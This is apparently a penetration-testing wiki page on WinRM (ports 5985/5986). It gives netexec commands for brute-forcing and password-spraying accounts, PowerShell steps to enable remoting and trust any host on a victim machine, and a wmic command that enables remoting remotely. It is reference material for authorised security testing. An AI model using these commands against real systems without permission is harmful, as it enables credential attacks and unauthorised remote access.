---
description: Pentesting WinRM - TCP Ports 5985,5986
---

# WinRM

## Theory

Windows Remote Management (WinRM) is a Microsoft protocol that **allows remote management of Windows machines** over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.\
If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)\
The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports: **5985/tcp (HTTP) or 5986/tcp (HTTPS)**

## **Practice**

### Targeting Accounts

{% tabs %}
{% tab title="Bruteforce" %}
Be careful, brute-forcing winrm could block users.

```bash
netexec winrm <IP> -d <Domain Name> -u <userlist> -p <passwlist>
```
{% endtab %}

{% tab title="Password Spray" %}
We can use following command to password spray

```bash
netexec winrm <IP> -d <Domain Name> -u <userlist> -p 'Passw0rd!'
```
{% endtab %}
{% endtabs %}

### Enable WinRM

Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector. However, for instances where this is not the case, we can enable it using powershell

{% tabs %}
{% tab title="Enable WinRM" %}
If we have access to an **elevated PowerShell** prompt on the victim, we cam enable it and add any "attackers" as trusted hosts. We can run the following two commands

```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```

We can also **activate** WinRM **remotely** using wmic

```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
{% endtab %}

{% tab title="Check configuration" %}
use the `Test-WSMan` function to test whether the target is configured for WinRM. You should see some information returned about the protocol version and wsmid:

```powershell
#Check locally
Test-WSMan

#Check remotely
Test-WSMan -ComputerName <TARGET>
```
{% endtab %}
{% endtabs %}

### Execute Remote Commands

{% content-ref url="../../redteam/pivoting/winrm.md" %}
[winrm.md](../../redteam/pivoting/winrm.md)
{% endcontent-ref %}

## **Resources**

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm" %}
